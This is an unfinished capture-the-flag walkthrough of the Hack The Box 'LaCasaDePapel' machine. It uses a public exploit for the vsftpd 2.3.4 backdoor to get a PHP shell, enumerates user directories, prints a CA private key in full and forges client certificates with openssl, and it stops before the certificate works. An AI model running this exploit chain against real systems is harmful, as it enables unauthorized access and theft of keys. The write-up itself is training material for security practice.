---
tags: 
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/509c1d6ddf04cf3d3f8054a564f2e93a.png)

- Machine : https://app.hackthebox.com/machines/lacasadepapel
- Reference : https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html
- Solved : 2025.00.00. (Thu) (Takes 0days)

## Summary
---


### Key Techniques:


---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.131
Performing quick port scan on 10.10.10.131...
Found open ports: 21,22,80,443,6200
Performing detailed scan on 10.10.10.131...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 10:54 MST
Nmap scan report for 10.10.10.131
Host is up (0.14s latency).

PORT     STATE    SERVICE  VERSION
21/tcp   open     ftp      vsftpd 2.3.4
22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp   open     http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp  open     ssl/http Node.js Express framework
|_ssl-date: TLS randomness does not represent time
|_http-title: La Casa De Papel
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
6200/tcp filtered lm-x
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.29 seconds
```

### http(80)

![](attachments/lacasa_1.png)

I sent a mock request, and captured this with Burpsuite.

![](attachments/lacasa_3.png)

Apart from `Token`, and `email`, there is one more parameter `secret`.
This one is same as QR code's secret, and changing every time.
It seems worth nothing for now.

### https(443)

![](attachments/lacasa_2.png)

It's saying that I need a certificate to continue.
If there's any way to generate or fetch the certificate, that could be a breakthrough.

### ftp(21)

```bash
┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ ftp anonymous@10.10.10.131
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```

It doesn't allow anonymous login..
But wait..! The ftp version is 2.3.4!
This one is infamous to have backdoor to open a shell via another port apart from 21.



# Shell as `???`

 Let's search exploits.
 
```bash
┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ searchsploit vsftp 2.3.4             
----------------------------------------------------------- ---------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------
vsftpd 2.3.4 - Backdoor Command Execution                  | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)     | unix/remote/17491.rb
----------------------------------------------------------- ---------------------


┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ searchsploit -m unix/remote/49757.py 
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
    Codes: CVE-2011-2523
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/LaCasa/49757.py
```

Let's use `unix/remote/49757.py`.

```bash
┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ python2 49757.py 10.10.10.131
Success, shell opened
Send `exit` to quit shell
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```

The exploit worked, and I got a shell.
However, the shell doesn't look like normal shell.

```bash
id
PHP Warning:  Use of undefined constant id - assumed 'id' (this will throw an Error in a future version of PHP) in phar://eval()'d code on line 1

whaomi
PHP Warning:  Use of undefined constant whaomi - assumed 'whaomi' (this will throw an Error in a future version of PHP) in phar://eval()'d code on line 1

whoami
PHP Warning:  Use of undefined constant whoami - assumed 'whoami' (this will throw an Error in a future version of PHP) in phar://eval()'d code on line 1

system('echo test')
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
```

It seems that normal linux commands are blocked.
It seems that the error is from PHP language.

https://psysh.org/
I googled more, and found out that Psy Shell is PHP shell taking PHP language.

I tested running several PHP commands, and it worked.

```php
get_current_user()
=> "root"

getcwd()
=> "/"

scandir('/home')  
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
```

Then I enumerated users' home directory.

```ruby
scandir('/home/berlin')
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
scandir('/home/dali')
=> [
     ".",
     "..",
     ".ash_history",
     ".config",
     ".qmail-default",
     ".ssh",
     "server.js",
   ]
scandir('/home/nairobi')
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
scandir('/home/oslo')
=> [
     ".",
     "..",
     "Maildir",
     "inbox.jade",
     "index.jade",
     "node_modules",
     "package-lock.json",
     "server.js",
     "static",
   ]
scandir('/home/professor')
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "memcached.ini",
     "memcached.js",
     "node_modules",
   ]
```

I tried to check if there's any RSA private key, but failed.

```php
scandir('/home/berlin/.ssh')
PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1                                                                         
scandir('/home/dali/.ssh')
=> [
     ".",
     "..",
     "authorized_keys",
     "known_hosts",
   ]
   
scandir('/home/professor/.ssh')
PHP Warning:  scandir(/home/professor/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1       
```

What about `ca.key` file? Since we observed that we were limited on https service without certificate before, this might be helpful to move forward.

Luckily, I was able to read the key.

```php
show $tokyo
  > 2| class Tokyo {
    3|  private function sign($caCert,$userCsr) {
    4|          $caKey = file_get_contents('/home/nairobi/ca.key');
    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);                                                                                   
    6|          openssl_x509_export($userCert, $userCertOut);
    7|          return $userCertOut;
    8|  }
    9| }



file_get_contents('/home/nairobi/ca.key')
=> """
	-----BEGIN PRIVATE KEY-----
	MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
	7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
	2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
	uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
	YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
	s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
	PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
	Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
	1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
	/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
	q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
	uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
	I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
	7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
	G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
	sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
	CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
	sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
	ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
	zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
	ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
	9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
	WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
	7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
	aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
	53udBEzjt3WPqYGkkDknVhjD
	-----END PRIVATE KEY-----
	"""
```

Let's check TLS configuration using `openssl`.

```bash
┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ openssl s_client -connect 10.10.10.131:443
Connecting to 10.10.10.131
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=lacasadepapel.htb, O=La Casa De Papel
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=lacasadepapel.htb, O=La Casa De Papel
verify return:1
---
Certificate chain
 0 s:CN=lacasadepapel.htb, O=La Casa De Papel
   i:CN=lacasadepapel.htb, O=La Casa De Papel
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Jan 27 08:35:30 2019 GMT; NotAfter: Jan 24 08:35:30 2029 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
-----END CERTIFICATE-----
subject=CN=lacasadepapel.htb, O=La Casa De Papel
issuer=CN=lacasadepapel.htb, O=La Casa De Papel
---
Acceptable client certificate CA names
CN=lacasadepapel.htb, O=La Casa De Papel
Client Certificate Types: RSA sign, DSA sign, ECDSA sign
Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Shared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Peer signing digest: SHA512
Peer signature type: RSA
Server Temp Key: ECDH, prime256v1, 256 bits
---
SSL handshake has read 1537 bytes and written 576 bytes
Verification error: self-signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256
Protocol: TLSv1.2
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES128-GCM-SHA256
    Session-ID: F67E3D8034DE5779430E519200A1207228115772B9EA6B39101F630815B937CF
    Session-ID-ctx: 
    Master-Key: 4690C828EFD19227FCA102AF02E1E13CF5A5633C10F3207C861A10B5E9B598F2747FCF10D001B6A51FFFF3C2C7BCFE2A
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - c4 16 43 6b c7 6a 25 28-7f d8 8e 05 87 7b 92 f7   ..Ck.j%(.....{..
    0010 - 36 c6 46 f5 8b 8b f4 3c-08 13 8b 4f af 29 f8 1b   6.F....<...O.)..
    0020 - 6b 40 fb fe ba 16 ec a3-5b e6 27 e6 aa 84 ed d5   k@......[.'.....
    0030 - da c8 69 9a 65 7a 71 8b-55 19 e1 48 c8 2e 8f ec   ..i.ezq.U..H....
    0040 - b9 e8 c6 e1 8b 44 14 2e-99 eb 8b 8d d5 00 88 cf   .....D..........
    0050 - 74 92 8e a5 1c a1 f9 89-2b ed ad e8 32 5e 2c df   t.......+...2^,.
    0060 - 3e f6 cd bf 6a e5 d3 45-94 e7 9f ce 09 0d 5d 23   >...j..E......]#
    0070 - 42 83 fd 9c 4e 84 79 ad-5b 7e 32 7f b6 e6 e2 c5   B...N.y.[~2.....
    0080 - 27 0a 73 11 0f 8e 7b 00-b1 a3 b4 6a 3d 0c d5 09   '.s...{....j=...
    0090 - 2b f9 07 9d ec bc ae 97-3f ee f6 ab 20 8e 0e 46   +.......?... ..F
    00a0 - 2b a3 fc 39 54 59 ee f3-b8 df 83 3b 56 6c 33 3a   +..9TY.....;Vl3:
    00b0 - d0 18 6e 3d a3 f1 09 74-b4 7a 6d 2e 40 99 6d 91   ..n=...t.zm.@.m.

    Start Time: 1741465725
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
---
```

Let's make a certificate for browser.

```bash
┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out bokchee.pem
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:



┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ openssl pkcs12 -export -in bokchee.pem -inkey ca.key -out bokchee.p12
Enter Export Password:
Verifying - Enter Export Password:
```

```bash
┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ openssl req -new -key client.key -out client.csr -subj "/CN=lacasadepapel.htb/O=La Casa De Papel"


┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ ls
49757.py  bokchee.p12  bokchee.pem  ca.key  client.csr  client.key  exploit.py


┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ openssl x509 -req -in client.csr -CA bokchee.pem -CAkey ca.key -CAcreateserial -out client.crt -days 1024 -sha256
Certificate request self-signature ok
subject=CN=lacasadepapel.htb, O=La Casa De Papel


┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ ls
49757.py     bokchee.pem  ca.key      client.csr  exploit.py
bokchee.p12  bokchee.srl  client.crt  client.key


┌──(kali㉿kali)-[~/htb/LaCasa]
└─$ openssl pkcs12 -export -inkey client.key -in client.crt -out client.p12
Enter Export Password:
Verifying - Enter Export Password:
```



Then, I imported `bokchee.p12` file to browser.
Firefox - Settings - Certificates - View Certificates - Your Certificates - Import

![](attachments/lacasa_4.png)


![](attachments/Pasted%20image%2020250309011143.png)


> Stop here...
> The certificate keeps not working.
> May have to visit later.